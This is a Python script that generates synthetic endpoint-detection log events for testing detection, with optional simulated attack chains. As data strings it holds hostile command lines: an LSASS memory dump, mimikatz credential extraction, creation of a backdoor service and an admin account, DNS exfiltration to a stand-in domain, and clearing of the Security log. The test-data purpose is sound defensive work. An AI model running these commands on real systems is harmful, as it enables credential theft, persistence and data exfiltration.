#!/usr/bin/env python3
"""
Script to generate sample EDR data for testing.

This script creates synthetic EDR logs with various event types and
optionally injects a simulated attack sequence for detection.

Usage:
    python generate_sample_data.py [options]

Options:
    --output-dir PATH       Directory to save the sample data (default: ./data/sample)
    --num-events N          Number of events to generate (default: 100)
    --inject-attack         Inject a simulated attack sequence (default: True)
    --attack-type TYPE      Type of attack to inject (default: "standard")
                            Options: "standard", "lateral", "persistence", "data_exfil"
    --output-format FORMAT  Output format (default: "json")
                            Options: "json", "csv"
    --help                  Show this help message and exit
"""

import os
import sys
import json
import random
import argparse
import csv
from datetime import datetime, timedelta
from pathlib import Path

# Add the parent directory to sys.path to enable module imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from src.utils import generate_sample_data
    UTILS_AVAILABLE = True
except ImportError:
    UTILS_AVAILABLE = False
    print("Warning: Could not import src.utils. Using standalone mode.")

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Generate sample EDR data for testing")
    
    parser.add_argument(
        "--output-dir",
        default="./data/sample",
        help="Directory to save the sample data (default: ./data/sample)"
    )
    
    parser.add_argument(
        "--num-events",
        type=int,
        default=100,
        help="Number of events to generate (default: 100)"
    )
    
    parser.add_argument(
        "--inject-attack",
        action="store_true",
        default=True,
        help="Inject a simulated attack sequence (default: True)"
    )
    
    parser.add_argument(
        "--attack-type",
        choices=["standard", "lateral", "persistence", "data_exfil"],
        default="standard",
        help="Type of attack to inject (default: 'standard')"
    )
    
    parser.add_argument(
        "--output-format",
        choices=["json", "csv"],
        default="json",
        help="Output format (default: 'json')"
    )
    
    return parser.parse_args()

def standalone_generate_sample_data(output_dir, num_events=100, inject_attack=True, 
                                   attack_type="standard", output_format="json"):
    """
    Generate sample EDR data for testing (standalone implementation).
    
    Args:
        output_dir: Directory to save the sample data
        num_events: Number of events to generate
        inject_attack: Whether to inject a simulated attack sequence
        attack_type: Type of attack to inject
        output_format: Output format (json or csv)
        
    Returns:
        Path to the saved file
    """
    print(f"Generating {num_events} sample EDR events...")
    
    # Create output directory if it doesn't exist
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    # Event types with relative frequencies
    event_types = {
        "process": 30,
        "netconn": 20,
        "filemod": 15,
        "regmod": 10,
        "moduleload": 10,
        "childproc": 8,
        "crossproc": 5,
        "remotethread": 1,
        "tamper": 1
    }
    
    # Weighted event type list
    weighted_types = []
    for event_type, weight in event_types.items():
        weighted_types.extend([event_type] * weight)
    
    # Sample process names
    process_names = [
        "svchost.exe", "explorer.exe", "chrome.exe", "firefox.exe", "outlook.exe",
        "powershell.exe", "cmd.exe", "rundll32.exe", "regsvr32.exe", "services.exe",
        "lsass.exe", "winlogon.exe", "csrss.exe", "conhost.exe", "notepad.exe",
        "taskmgr.exe", "iexplore.exe", "wmiprvse.exe", "spoolsv.exe", "msiexec.exe"
    ]
    
    # Sample hostnames
    hostnames = [
        "DESKTOP-1A2B3C4", "LAPTOP-XYZ1234", "WIN-ABCDEF", "WORKSTATION-01",
        "SERVER-DC-01", "FINANCE-PC-02", "HR-LAPTOP-05", "RECEPTION-PC", "CEO-LAPTOP"
    ]
    
    # Sample usernames
    usernames = [
        "admin", "jsmith", "agarcia", "mwilliams", "rjohnson", "tlee", 
        "system", "NETWORK SERVICE", "LOCAL SERVICE", "bjones"
    ]
    
    # Sample commands
    commands = [
        "C:\\Windows\\System32\\{} /s /p",
        "{} --no-sandbox --user-data-dir=C:\\Users\\{}\\AppData\\Local\\Temp",
        "\"{}\" -WindowStyle Hidden -ExecutionPolicy Bypass -Command {}",
        "{} /c {} & {}",
        "C:\\Program Files\\{}\\{} --update",
        "{} -k {} -o {} -p {}"
    ]
    
    # Sample IPs
    ips = [
        "192.168.1.1", "10.0.0.1", "172.16.0.1", "8.8.8.8", "1.1.1.1",
        "203.0.113.1", "198.51.100.1", "104.16.23.29", "172.217.168.238"
    ]
    
    # Generate events
    events = []
    base_time = datetime.now() - timedelta(hours=24)
    pids = {}  # Keep track of processes
    
    for i in range(num_events):
        # Generate timestamp
        event_time = base_time + timedelta(seconds=i*60 + random.randint(0, 30))
        
        # Select event type
        event_type = random.choice(weighted_types)
        
        # Generate event data
        hostname = random.choice(hostnames)
        username = random.choice(usernames)
        
        # Generate process info
        process_name = random.choice(process_names)
        process_pid = random.randint(1000, 9999)
        
        # Store process info
        pids[process_pid] = process_name
        
        # Generate parent process info
        if pids and random.random() < 0.7:  # 70% chance to have a known parent
            parent_pid = random.choice(list(pids.keys()))
            parent_name = pids[parent_pid]
        else:
            parent_pid = random.randint(1000, 9999)
            parent_name = random.choice(process_names)
            pids[parent_pid] = parent_name
        
        # Generate command line
        if event_type in ["process", "childproc"]:
            command_tpl = random.choice(commands)
            command_line = command_tpl.format(
                process_name,
                random.choice(process_names),
                username,
                random.choice(process_names),
                random.choice(process_names),
                random.choice(process_names)
            )
        else:
            command_line = ""
        
        # Generate severity (1-8)
        severity = 1  # Default low severity
        
        # Higher severity for suspicious activity
        if process_name in ["powershell.exe", "cmd.exe", "rundll32.exe", "regsvr32.exe"]:
            severity += 1
        
        if event_type in ["remotethread", "tamper", "crossproc"]:
            severity += 2
        
        # Generate the event
        event = {
            "event_id": f"evt-{i+1}",
            "timestamp": event_time.strftime("%Y-%m-%d %H:%M:%S"),
            "event_type": event_type,
            "hostname": hostname,
            "username": username,
            "process_name": process_name,
            "process_pid": process_pid,
            "parent_name": parent_name,
            "parent_id": parent_pid,
            "command_line": command_line,
            "severity": severity
        }
        
        # Add event-type specific fields
        if event_type == "netconn":
            event["remote_ip"] = random.choice(ips)
            event["remote_port"] = random.choice([80, 443, 8080, 22, 3389, 445, 135])
            event["protocol"] = random.choice(["TCP", "UDP"])
            
        elif event_type == "filemod":
            event["file_path"] = f"C:\\Users\\{username}\\{random.choice(['Documents', 'Downloads', 'AppData\\Local\\Temp'])}\\{random.randint(1, 999)}.{random.choice(['exe', 'dll', 'bat', 'ps1', 'txt'])}"
            event["file_operation"] = random.choice(["create", "modify", "delete", "rename"])
            
        elif event_type == "regmod":
            event["registry_key"] = f"HKEY_{random.choice(['LOCAL_MACHINE', 'CURRENT_USER'])}\\{random.choice(['SOFTWARE\\Microsoft\\Windows', 'SYSTEM\\CurrentControlSet', 'SOFTWARE\\Policies'])}"
            event["registry_operation"] = random.choice(["create", "modify", "delete"])
        
        # Add a malicious IOC in 5% of events
        if random.random() < 0.05:
            event["ioc_match"] = True
            event["ioc_type"] = random.choice(["hash", "domain", "ip", "file", "registry"])
            event["severity"] += 2
            
        events.append(event)
    
    # Inject attack sequence if requested
    if inject_attack and num_events >= 20:
        attack_start = random.randint(5, num_events - 15)
        
        if attack_type == "standard":
            # Stage 1: Initial Access - PowerShell with encoded command
            events[attack_start]["event_type"] = "process"
            events[attack_start]["process_name"] = "powershell.exe"
            events[attack_start]["command_line"] = "powershell.exe -WindowStyle Hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVABlAG0AcABcAHMAYwByAGkAcAB0AC4AZQB4AGUA"
            events[attack_start]["severity"] = 5
            
            # Stage 2: Command and Control - Network connection to C2
            events[attack_start + 1]["event_type"] = "netconn"
            events[attack_start + 1]["process_name"] = "powershell.exe"
            events[attack_start + 1]["remote_ip"] = "203.0.113.1"  # Fictitious IOC
            events[attack_start + 1]["remote_port"] = 443
            events[attack_start + 1]["protocol"] = "TCP"
            events[attack_start + 1]["severity"] = 6
            events[attack_start + 1]["ioc_match"] = True
            
            # Stage 3: File Creation - Dropper creates payload
            events[attack_start + 2]["event_type"] = "filemod"
            events[attack_start + 2]["process_name"] = "powershell.exe"
            events[attack_start + 2]["file_path"] = "C:\\Windows\\Temp\\system_update.exe"
            events[attack_start + 2]["file_operation"] = "create"
            events[attack_start + 2]["severity"] = 7
            
            # Stage 4: Execution - Malicious payload execution
            events[attack_start + 3]["event_type"] = "process"
            events[attack_start + 3]["process_name"] = "system_update.exe"
            events[attack_start + 3]["command_line"] = "C:\\Windows\\Temp\\system_update.exe -silent"
            events[attack_start + 3]["parent_name"] = "powershell.exe"
            events[attack_start + 3]["parent_id"] = events[attack_start]["process_pid"]
            events[attack_start + 3]["severity"] = 8
            
            # Stage 5: Privilege Escalation - UAC bypass
            events[attack_start + 4]["event_type"] = "process"
            events[attack_start + 4]["process_name"] = "cmd.exe"
            events[attack_start + 4]["command_line"] = "cmd.exe /c whoami /priv"
            events[attack_start + 4]["parent_name"] = "system_update.exe"
            events[attack_start + 4]["parent_id"] = events[attack_start + 3]["process_pid"]
            events[attack_start + 4]["severity"] = 8
            
            # Stage 6: Credential Access - LSASS dump
            events[attack_start + 5]["event_type"] = "process"
            events[attack_start + 5]["process_name"] = "rundll32.exe"
            events[attack_start + 5]["command_line"] = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
            events[attack_start + 5]["parent_name"] = "cmd.exe"
            events[attack_start + 5]["parent_id"] = events[attack_start + 4]["process_pid"]
            events[attack_start + 5]["severity"] = 9
            
            # Stage 7: Data Exfiltration - Connection to C2 to exfiltrate data
            events[attack_start + 6]["event_type"] = "netconn"
            events[attack_start + 6]["process_name"] = "system_update.exe"
            events[attack_start + 6]["remote_ip"] = "203.0.113.1"  # Same C2 as before
            events[attack_start + 6]["remote_port"] = 8443
            events[attack_start + 6]["protocol"] = "TCP"
            events[attack_start + 6]["severity"] = 9
            events[attack_start + 6]["ioc_match"] = True
            
        elif attack_type == "lateral":
            # Stage 1: Initial Access - RDP connection
            events[attack_start]["event_type"] = "netconn"
            events[attack_start]["process_name"] = "mstsc.exe"
            events[attack_start]["remote_ip"] = "10.0.0.5"
            events[attack_start]["remote_port"] = 3389
            events[attack_start]["protocol"] = "TCP"
            events[attack_start]["severity"] = 4
            
            # Stage 2: Credential Access - Password dumping tool
            events[attack_start + 1]["event_type"] = "process"
            events[attack_start + 1]["process_name"] = "mimikatz.exe"
            events[attack_start + 1]["command_line"] = "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
            events[attack_start + 1]["severity"] = 9
            events[attack_start + 1]["ioc_match"] = True
            
            # Stage 3: Discovery - Network scanning
            events[attack_start + 2]["event_type"] = "process"
            events[attack_start + 2]["process_name"] = "nmap.exe"
            events[attack_start + 2]["command_line"] = "nmap.exe -sS -p 445 10.0.0.0/24"
            events[attack_start + 2]["severity"] = 7
            
            # Stage 4: Lateral Movement - SMB connection to another host
            events[attack_start + 3]["event_type"] = "netconn"
            events[attack_start + 3]["process_name"] = "cmd.exe"
            events[attack_start + 3]["remote_ip"] = "10.0.0.25"
            events[attack_start + 3]["remote_port"] = 445
            events[attack_start + 3]["protocol"] = "TCP"
            events[attack_start + 3]["severity"] = 6
            
            # Stage 5: Lateral Movement - Remote service creation
            events[attack_start + 4]["event_type"] = "process"
            events[attack_start + 4]["process_name"] = "sc.exe"
            events[attack_start + 4]["command_line"] = "sc.exe \\\\10.0.0.25 create backdoor binpath= \"cmd.exe /c powershell.exe -WindowStyle hidden -EncodedCommand <base64>\""
            events[attack_start + 4]["severity"] = 8
            
            # Stage 6: Command and Control from new host
            events[attack_start + 5]["event_type"] = "netconn"
            events[attack_start + 5]["hostname"] = "SERVER-DC-01"  # Different host
            events[attack_start + 5]["process_name"] = "powershell.exe"
            events[attack_start + 5]["remote_ip"] = "198.51.100.1"  # Different C2
            events[attack_start + 5]["remote_port"] = 443
            events[attack_start + 5]["protocol"] = "TCP"
            events[attack_start + 5]["severity"] = 7
            events[attack_start + 5]["ioc_match"] = True
            
        elif attack_type == "persistence":
            # Stage 1: Initial execution
            events[attack_start]["event_type"] = "process"
            events[attack_start]["process_name"] = "powershell.exe"
            events[attack_start]["command_line"] = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\admin\\script.ps1"
            events[attack_start]["severity"] = 4
            
            # Stage 2: Registry modification - Run key persistence
            events[attack_start + 1]["event_type"] = "regmod"
            events[attack_start + 1]["process_name"] = "powershell.exe"
            events[attack_start + 1]["registry_key"] = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            events[attack_start + 1]["registry_operation"] = "create"
            events[attack_start + 1]["severity"] = 7
            
            # Stage 3: Scheduled task creation
            events[attack_start + 2]["event_type"] = "process"
            events[attack_start + 2]["process_name"] = "schtasks.exe"
            events[attack_start + 2]["command_line"] = "schtasks.exe /create /sc minute /mo 30 /tn \"Windows Update Helper\" /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\update.ps1\""
            events[attack_start + 2]["severity"] = 6
            
            # Stage 4: WMI persistence
            events[attack_start + 3]["event_type"] = "process"
            events[attack_start + 3]["process_name"] = "powershell.exe"
            events[attack_start + 3]["command_line"] = "powershell.exe -Command \"Set-WmiInstance -Class __EventFilter -NameSpace 'root\\subscription'\""
            events[attack_start + 3]["severity"] = 8
            
            # Stage 5: Backdoor user creation
            events[attack_start + 4]["event_type"] = "process"
            events[attack_start + 4]["process_name"] = "net.exe"
            events[attack_start + 4]["command_line"] = "net.exe user backdoor P@ssw0rd123! /add"
            events[attack_start + 4]["severity"] = 9
            
            # Stage 6: Adding user to administrators group
            events[attack_start + 5]["event_type"] = "process"
            events[attack_start + 5]["process_name"] = "net.exe"
            events[attack_start + 5]["command_line"] = "net.exe localgroup administrators backdoor /add"
            events[attack_start + 5]["severity"] = 9
            
        elif attack_type == "data_exfil":
            # Stage 1: Initial process
            events[attack_start]["event_type"] = "process"
            events[attack_start]["process_name"] = "powershell.exe"
            events[attack_start]["command_line"] = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Get-ChildItem -Path C:\\Users\\admin\\Documents -Recurse -Filter *.docx\""
            events[attack_start]["severity"] = 3
            
            # Stage 2: File access - Sensitive documents
            events[attack_start + 1]["event_type"] = "filemod"
            events[attack_start + 1]["process_name"] = "powershell.exe"
            events[attack_start + 1]["file_path"] = "C:\\Users\\admin\\Documents\\Confidential\\Financial_Report_2025.docx"
            events[attack_start + 1]["file_operation"] = "read"
            events[attack_start + 1]["severity"] = 4
            
            # Stage 3: Archive creation
            events[attack_start + 2]["event_type"] = "process"
            events[attack_start + 2]["process_name"] = "7z.exe"
            events[attack_start + 2]["command_line"] = "7z.exe a -pinfected C:\\Windows\\Temp\\archive.zip C:\\Users\\admin\\Documents\\Confidential\\*.docx"
            events[attack_start + 2]["severity"] = 6
            
            # Stage 4: Data encryption
            events[attack_start + 3]["event_type"] = "process"
            events[attack_start + 3]["process_name"] = "openssl.exe"
            events[attack_start + 3]["command_line"] = "openssl.exe enc -aes-256-cbc -salt -in C:\\Windows\\Temp\\archive.zip -out C:\\Windows\\Temp\\data.enc -k secret_password"
            events[attack_start + 3]["severity"] = 7
            
            # Stage 5: DNS exfiltration tool
            events[attack_start + 4]["event_type"] = "process"
            events[attack_start + 4]["process_name"] = "dns-exfil.exe"
            events[attack_start + 4]["command_line"] = "dns-exfil.exe --file C:\\Windows\\Temp\\data.enc --domain exfil.malicious.com"
            events[attack_start + 4]["severity"] = 8
            events[attack_start + 4]["ioc_match"] = True
            
            # Stage 6: Multiple DNS queries (exfiltration)
            for i in range(5):
                idx = attack_start + 5 + i
                if idx < len(events):
                    events[idx]["event_type"] = "netconn"
                    events[idx]["process_name"] = "dns-exfil.exe"
                    events[idx]["remote_ip"] = "198.51.100.10"
                    events[idx]["remote_port"] = 53
                    events[idx]["protocol"] = "UDP"
                    events[idx]["severity"] = 7
            
            # Stage 7: Evidence cleanup
            events[attack_start + 10]["event_type"] = "process"
            events[attack_start + 10]["process_name"] = "cmd.exe"
            events[attack_start + 10]["command_line"] = "cmd.exe /c del C:\\Windows\\Temp\\*.enc C:\\Windows\\Temp\\*.zip & wevtutil cl Security"
            events[attack_start + 10]["severity"] = 8
    
    # Save events to file
    if output_format == "json":
        file_path = output_path / "sample_edr_data.json"
        with open(file_path, 'w') as file:
            json.dump({"events": events}, file, indent=2)
    else:  # CSV format
        file_path = output_path / "sample_edr_data.csv"
        
        # Get all possible fields
        fields = set()
        for event in events:
            fields.update(event.keys())
        
        with open(file_path, 'w', newline='') as file:
            writer = csv.DictWriter(file, fieldnames=sorted(fields))
            writer.writeheader()
            writer.writerows(events)
    
    print(f"Generated {num_events} sample EDR events at {file_path}")
    if inject_attack:
        print(f"Injected simulated '{attack_type}' attack sequence starting at event {attack_start+1}")
    
    return file_path

def main():
    """Main function."""
    args = parse_arguments()
    
    if UTILS_AVAILABLE:
        # Use the utility function from src.utils
        generate_sample_data(
            Path(args.output_dir),
            args.num_events
        )
    else:
        # Use the standalone implementation
        standalone_generate_sample_data(
            args.output_dir,
            args.num_events,
            args.inject_attack,
            args.attack_type,
            args.output_format
        )

if __name__ == "__main__":
    main()